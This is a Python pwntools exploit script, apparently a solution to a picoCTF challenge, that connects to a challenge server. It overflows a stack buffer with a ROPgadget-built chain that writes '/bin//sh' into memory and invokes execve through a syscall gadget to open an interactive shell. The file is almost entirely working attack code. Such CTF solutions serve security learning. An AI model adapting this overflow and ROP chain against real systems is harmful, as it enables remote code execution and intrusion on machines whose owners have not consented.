#!/usr/bin/env python3
# execve generated by ROPgadget
from pwn import *

p = remote('jupiter.challenges.picoctf.org', 51462)
# Padding goes here
payload = b'a'*120

payload += p64(0x410ca3) # pop rsi ; ret
payload += p64(0x6ba0e0) # @ .data
payload += p64(0x4163f4) # pop rax ; ret
payload += b'/bin//sh'
payload += p64(0x47ff91) # mov qword ptr [rsi], rax ; ret
payload += p64(0x410ca3) # pop rsi ; ret
payload += p64(0x6ba0e8) # @ .data + 8
payload += p64(0x445950) # xor rax, rax ; ret
payload += p64(0x47ff91) # mov qword ptr [rsi], rax ; ret
payload += p64(0x400b73) # get_random
payload += p64(0)
payload += p64(0x400696) # pop rdi ; ret
payload += p64(0x6ba0e0) # @ .data
payload += p64(0x410ca3) # pop rsi ; ret
payload += p64(0x6ba0e8) # @ .data + 8
payload += p64(0x44a6b5) # pop rdx ; ret
payload += p64(0x6ba0e8) # @ .data + 8
payload += p64(0x40137c) # syscall

p.recvlines(2)
for i in range(12):
    p.recvline()
    p.sendlines("1")
    p.recvlines(2)

p.recvline()
p.sendline("91")
p.recvuntil("? ")
p.sendline(payload)

p.interactive()
